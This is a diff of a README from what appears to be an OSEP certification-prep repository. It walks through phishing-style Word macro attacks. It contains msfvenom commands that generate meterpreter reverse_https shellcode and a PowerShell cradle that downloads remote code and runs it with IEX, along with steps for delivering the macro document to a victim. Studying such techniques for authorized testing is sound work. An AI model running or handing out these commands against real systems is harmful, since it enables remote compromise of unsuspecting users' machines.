@@ -14,7 +14,7 @@ The simply VBA way works with in an enviroment with no AV or EDR mechanism enabl
 
 2. Then, we make use of [PSHTTPDownloader.vba](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/VBA/PSHTTPDownloader.vba) in order to download and store in the victim machine the msfvenom payload we crafted before and then we execute it. 
 
-3. Finally, with the PSHTTPDownloader.vba, we make a [macro](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/VBA/README.md) on a Word document and deliver the document. 
+3. Finally, with the contents PSHTTPDownloader.vba properly formed, we make a [macro](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/VBA/README.md) on a Word document and deliver the document. 
 
 4. We retrieve the connection by using a [listener](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/Payloads/MsfVenom/Listener.sh).
 
@@ -36,7 +36,11 @@ We can directly create a macro that stores a shellcode and execute it.
 
 1. First we create a Shellcode for a 'vbaapplication' making use of [ShellCode.sh](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/Payloads/MsfVenom/ShellCode.sh)
 
-2. Then, make use of the [ShellCode.vba](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/VBA/ShellCode.vba) and paste on it the crafted shellcode. 
+    ```shell
+    msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=<LPORT> EXITFUNC=thread -f vbapplication
+    ```
+
+2. Then, make use of the [ShellCode.vba](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/VBA/ShellCode.vba) and paste on it the crafted shellcode replacing the *buf* variable. 
 
 3. With the ShellCode.vba finished, we make a [macro](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/VBA/README.md) on a Word document and deliver the document.
 
@@ -55,7 +59,7 @@ We can execute the code of a remote script by using some Powershell methods.
 
 1. First we craft our shellcode with the help of [ShellCode.sh](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/Payloads/MsfVenom/ShellCode.sh) file for a 'ps1' application, this is:
 
-    ```powershell
+    ```shell
     msfvenom -p windows/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -f ps1
     ```
 2. Once we craft it, we paste it in the '$buf' variable of [VBAenvlauncher.ps1](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/PowerShell/VBAenvlauncher.ps1) script.
@@ -63,7 +67,7 @@ We can execute the code of a remote script by using some Powershell methods.
 3. Then, we make use of [LaunchinApp_Shell.vba](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/VBA/LaunchinApp_Shell.vba) to execute a PowerShell program that downloads and executes the prepared VBAenvlauncher.ps1 script. The line stored on the *str* var must be:
 
     ```powershell
-    powershell (New-Object System.Net.WebClient).DownloadFile('<URL>', '<OUTFILE>') | IEX
+    powershell (New-Object System.Net.WebClient).DownloadString('<URL>') | IEX
     ```
 
     Replacing the \<URL\> and \<OUTFILE\> with the proper vaules.
